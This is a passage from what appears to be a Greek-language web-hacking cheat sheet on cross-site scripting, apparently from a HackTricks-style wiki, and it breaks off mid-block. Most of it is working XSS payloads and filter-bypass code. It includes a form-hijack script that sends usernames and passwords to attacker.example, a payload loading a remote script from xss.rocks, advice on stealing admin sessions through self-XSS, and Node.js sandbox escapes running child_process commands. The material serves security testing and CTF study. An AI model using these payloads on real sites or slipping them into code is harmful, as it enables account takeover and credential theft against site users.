Αν βρείτε ένα **XSS σε ένα πολύ μικρό σημείο** της σελίδας που απαιτεί κάποιο είδος αλληλεπίδρασης (ίσως ένα μικρό link στο footer με ένα onmouseover element), μπορείτε να προσπαθήσετε να **τροποποιήσετε τον χώρο που καταλαμβάνει το στοιχείο** για να αυξήσετε τις πιθανότητες να ενεργοποιηθεί το link.

Για παράδειγμα, μπορείτε να προσθέσετε κάποια styling στο στοιχείο όπως: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Αλλά, αν ο WAF φιλτράρει το style attribute, μπορείτε να χρησιμοποιήσετε CSS Styling Gadgets, οπότε αν βρείτε, για παράδειγμα

> .test {display:block; color: blue; width: 100%\}

και

> \#someid {top: 0; font-family: Tahoma;}

Τώρα μπορείτε να τροποποιήσετε το link σας και να το φέρετε στη μορφή

> \<a href="" id=someid class=test onclick=alert() a="">

Αυτό το κόλπο προέρχεται από [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Ένεση μέσα σε JavaScript code

Σε αυτές τις περιπτώσεις το **input** σας θα ανακλαστεί μέσα στον JS κώδικα ενός `.js` αρχείου ή ανάμεσα σε `<script>...</script>` tags ή σε HTML events που μπορούν να εκτελέσουν JS code ή σε attributes που δέχονται το πρωτόκολλο `javascript:`.

### Αποφυγή \<script> tag

Αν ο κώδικάς σας εισάγεται μέσα σε `<script> [...] var input = 'reflected data' [...] </script>` μπορείτε εύκολα να **αποδράσετε κλείνοντας το `<script>`** tag:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Σημειώστε ότι σε αυτό το παράδειγμα **δεν έχουμε καν κλείσει το μονό εισαγωγικό**. Αυτό συμβαίνει επειδή **η HTML parsing εκτελείται πρώτα από τον browser**, η οποία περιλαμβάνει τον εντοπισμό στοιχείων της σελίδας, συμπεριλαμβανομένων των blocks of script. Η parsing του JavaScript για να κατανοήσει και να εκτελέσει τα ενσωματωμένα scripts πραγματοποιείται μόνο αργότερα.

### Μέσα στον JS κώδικα

Αν τα `<>` φιλτράρονται μπορείτε ακόμα να **κάνετε escape το string** όπου το input σας είναι **τοποθετημένο** και να **εκτελέσετε αυθαίρετο JS**. Είναι σημαντικό να **διορθώσετε τη σύνταξη του JS**, γιατί αν υπάρχουν σφάλματα, ο κώδικας JS δεν θα εκτελεστεί:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Όταν η είσοδος χρήστη καταλήγει μέσα σε ένα quoted JavaScript string (π.χ., server-side echo μέσα σε ένα inline script), μπορείτε να τερματίσετε το string, να inject κώδικα και να επιδιορθώσετε τη σύνταξη ώστε το parsing να παραμείνει έγκυρο. Γενικός σκελετός:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Παράδειγμα προτύπου URL όταν η ευάλωτη παράμετρος αντανακλάται σε JS string:
```
?param=test";<INJECTION>;a="
```
Αυτό εκτελεί attacker JS χωρίς να χρειάζεται να αγγίξετε το HTML context (pure JS-in-JS). Συνδυάστε το με blacklist bypasses παρακάτω όταν τα φίλτρα μπλοκάρουν keywords.

### Template literals \`\`

Για να δημιουργήσετε **συμβολοσειρές** πέρα από μονά και διπλά εισαγωγικά η JS επίσης δέχεται **backticks** **` `` `**. Αυτό είναι γνωστό ως template literals καθώς επιτρέπουν **ενσωματωμένες εκφράσεις JS** χρησιμοποιώντας τη σύνταξη `${ ... }`.\  
Επομένως, αν διαπιστώσετε ότι η είσοδός σας **αντανακλάται** μέσα σε μια JS string που χρησιμοποιεί backticks, μπορείτε να εκμεταλλευτείτε τη σύνταξη `${ ... }` για να εκτελέσετε **αυθαίρετο JS κώδικα**:

Αυτό μπορεί να **εκμεταλλευτεί** χρησιμοποιώντας:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Κωδικοποιημένη εκτέλεση κώδικα
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Παραδοτέα payloads με eval(atob()) και αποχρώσεις του scope

Για να κρατήσετε τις URLs πιο σύντομες και να παρακάμψετε αφελή φίλτρα λέξεων-κλειδιών, μπορείτε να κωδικοποιήσετε την πραγματική λογική σας σε base64 και να την εκτελέσετε με `eval(atob('...'))`. Αν ένα απλό φιλτράρισμα λέξεων-κλειδιών μπλοκάρει identifiers όπως `alert`, `eval` ή `atob`, χρησιμοποιήστε Unicode-escaped identifiers που μεταγλωττίζονται το ίδιο στον browser αλλά παρακάμπτουν φίλτρα αντιστοίχισης συμβολοσειρών:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Σημαντική λεπτομέρεια scoping: `const`/`let` που δηλώνονται μέσα σε `eval()` είναι block-scoped και ΔΕΝ δημιουργούν globals· δεν θα είναι προσβάσιμα από επόμενα scripts. Χρησιμοποιήστε ένα δυναμικά εισαγόμενο `<script>` στοιχείο για να ορίσετε global, non-rebindable hooks όταν χρειάζεται (π.χ., για να hijack έναν form handler):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Αναφορά: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Κωδικοποίηση Unicode για εκτέλεση JS
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript bypass blacklists τεχνικές

**Strings**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Ειδικά escapes**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Αντικαταστάσεις κενών μέσα σε JS code**
```javascript
<TAB>
/**/
```
**JavaScript comments (από** [**JavaScript Comments**](#javascript-comments) **κόλπο)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript νέες γραμμές (από** [**JavaScript new line**](#javascript-new-lines) **κόλπο)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**Λευκοί χαρακτήρες στο JavaScript**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript μέσα σε σχόλιο**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript χωρίς παρενθέσεις**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Αυθαίρετη κλήση συνάρτησης (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **Ευπάθειες DOM**

Υπάρχει **JS code** που χρησιμοποιεί **μη ασφαλή δεδομένα ελεγχόμενα από attacker** όπως `location.href`. Ένας attacker μπορεί να το εκμεταλλευτεί για να εκτελέσει αυθαίρετο JS code.\
**Due to the extension of the explanation of** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

Εκεί θα βρείτε μια λεπτομερή **explanation of what DOM vulnerabilities are, how are they provoked, and how to exploit them**.\
Επίσης, μην ξεχάσετε ότι **at the end of the mentioned post** μπορείτε να βρείτε μια εξήγηση για [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Αναβάθμιση Self-XSS

### Cookie XSS

If you can trigger a XSS by sending the payload inside a cookie, this is usually a self-XSS. However, if you find a **vulnerable subdomain to XSS**, you could abuse this XSS to inject a cookie in the whole domain managing to trigger the cookie XSS in the main domain or other subdomains (the ones vulnerable to cookie XSS). For this you can use the cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

You can find a great abuse of this technique in [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Αποστολή της session σας στον admin

Ίσως ένας user να μπορεί να μοιραστεί το προφίλ του με τον admin και αν το self XSS βρίσκεται μέσα στο προφίλ του user και ο admin το προσπελάσει, θα ενεργοποιήσει την ευπάθεια.

### Session Mirroring

Αν βρείτε κάποιο self XSS και η web page έχει **session mirroring for administrators**, για παράδειγμα επιτρέποντας σε clients να ζητούν βοήθεια και ώστε ο admin να σας βοηθήσει, θα βλέπει ό,τι βλέπετε στη session σας αλλά από τη δική του session.

Μπορείτε να κάνετε τον **administrator να ενεργοποιήσει το self XSS σας** και να κλέψετε τα cookies/session του.

## Άλλες Παράκαμψεις

### Παράκαμψη του sanitization μέσω WASM linear-memory template overwrite

When a web app uses Emscripten/WASM, constant strings (like HTML format stubs) live in writable linear memory. A single in‑WASM overflow (e.g., unchecked memcpy in an edit path) can corrupt adjacent structures and redirect writes to those constants. Overwriting a template such as "<article><p>%.*s</p></article>" to "<img src=1 onerror=%.*s>" turns sanitized input into a JavaScript handler value and yields immediate DOM XSS on render.

Check the dedicated page with exploitation workflow, DevTools memory helpers, and defenses:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Κανονικοποιημένο Unicode

You could check is the **reflected values** are being **unicode normalized** in the server (or in the client side) and abuse this functionality to bypass protections. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Εξαιτίας του **RoR mass assignment** εισάγονται εισαγωγικά στο HTML και έτσι παρακάμπτεται ο περιορισμός των εισαγωγικών και μπορούν να προστεθούν επιπλέον πεδία (onfocus) μέσα στο tag.\
Παράδειγμα φόρμας ([from this report](https://hackerone.com/reports/709336)), αν στείλετε το payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Το ζεύγος "Key","Value" θα επιστραφεί ως εξής:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Στη συνέχεια, το attribute onfocus θα εισαχθεί και θα προκληθεί XSS.

### Ειδικοί συνδυασμοί
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS with header injection in a 302 response

Αν διαπιστώσεις ότι μπορείς να **inject headers in a 302 Redirect response** μπορείς να δοκιμάσεις να **make the browser execute arbitrary JavaScript**. Αυτό δεν είναι **trivial**, καθώς οι σύγχρονοι browsers δεν ερμηνεύουν το HTTP response body αν ο HTTP response status code είναι 302, οπότε ένα απλό cross-site scripting payload είναι άχρηστο.

In [**this report**](https://www.gremwell.com/firefox-xss-302) and [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) μπορείς να διαβάσεις πώς να δοκιμάσεις διάφορα πρωτόκολλα μέσα στο Location header και να δεις αν κάποιο από αυτά επιτρέπει στον browser να επιθεωρήσει και να εκτελέσει το XSS payload μέσα στο body.\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Only Letters, Numbers and Dots

Αν μπορείς να υποδείξεις το **callback** που javascript πρόκειται να **execute** περιορισμένο σε αυτούς τους χαρακτήρες. [**Read this section of this post**](#javascript-function) για να βρεις πώς να καταχραστείς αυτήν την συμπεριφορά.

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Αν προσπαθήσεις να φορτώσεις ένα script με **content-type** όπως `application/octet-stream`, το Chrome θα βγάλει το ακόλουθο σφάλμα:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Οι μόνοι **Content-Type**s που θα υποστηρίξουν το Chrome να τρέξει ένα **loaded script** είναι αυτοί που βρίσκονται μέσα στο const **`kSupportedJavascriptTypes`** από [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Τύποι Script για XSS

(Από [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Λοιπόν, ποιοι τύποι μπορούν να υποδειχθούν για να φορτώσουν ένα script;
```html
<script type="???"></script>
```
Η απάντηση είναι:

- **module** (προεπιλογή, δεν χρειάζεται εξήγηση)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles είναι μια δυνατότητα που σας επιτρέπει να πακετάρετε πολλά δεδομένα (HTML, CSS, JS…) μαζί σε ένα αρχείο **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Επιτρέπει τη βελτίωση της σύνταξης import
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Αυτή η συμπεριφορά χρησιμοποιήθηκε στο [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) για να αντιστοιχιστεί μια βιβλιοθήκη σε eval — η κατάχρησή της μπορεί να προκαλέσει XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Αυτή η δυνατότητα στοχεύει κυρίως στην επίλυση ορισμένων προβλημάτων που προκαλούνται από το pre-rendering. Λειτουργεί ως εξής:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types για XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Τα παρακάτω content types μπορούν να εκτελέσουν XSS σε όλους τους browsers:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? δεν είναι στη λίστα αλλά νομίζω το είδα σε ένα CTF)
- application/rss+xml (off)
- application/atom+xml (off)

Σε άλλους browsers άλλα **`Content-Types`** μπορούν να χρησιμοποιηθούν για εκτέλεση αυθαίρετου JS, δείτε: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### Τύπος περιεχομένου xml

Αν η σελίδα επιστρέφει content-type text/xml, είναι δυνατόν να δηλωθεί ένα namespace και να εκτελεστεί αυθαίρετο JS:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Ειδικά Πρότυπα Αντικατάστασης

Όταν χρησιμοποιείται κάτι σαν **`"some {{template}} data".replace("{{template}}", <user_input>)`** ο επιτιθέμενος μπορεί να χρησιμοποιήσει [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) για να προσπαθήσει να παρακάμψει κάποιες προστασίες: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

For example in [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), this was used to **scape a JSON string** inside a script and execute arbitrary code.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Αν έχεις μόνο ένα περιορισμένο σύνολο χαρακτήρων προς χρήση, δες αυτές τις άλλες έγκυρες λύσεις για προβλήματα XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Αν **όλα είναι undefined** πριν από την εκτέλεση μη αξιόπιστου κώδικα (όπως στο [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)) είναι δυνατό να δημιουργηθούν χρήσιμα αντικείμενα "από το τίποτα" για να καταχραστεί η εκτέλεση αυθαίρετου μη αξιόπιστου κώδικα:

- Χρησιμοποιώντας import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Πρόσβαση στο `require` έμμεσα

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) τα modules τυλίγονται από το Node.js μέσα σε μια συνάρτηση, όπως αυτή:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Επομένως, εάν από εκείνο το module μπορούμε να **καλέσουμε άλλη συνάρτηση**, είναι δυνατό να χρησιμοποιήσουμε `arguments.callee.caller.arguments[1]` από εκείνη τη συνάρτηση για να προσπελάσουμε **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Με τρόπο παρόμοιο με το προηγούμενο παράδειγμα, είναι δυνατό να **use error handlers** για να αποκτήσετε πρόσβαση στο **wrapper** του module και να πάρετε τη συνάρτηση **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **Διάφορες obfuscations σε μία σελίδα:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Πιο εξελιγμένο JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
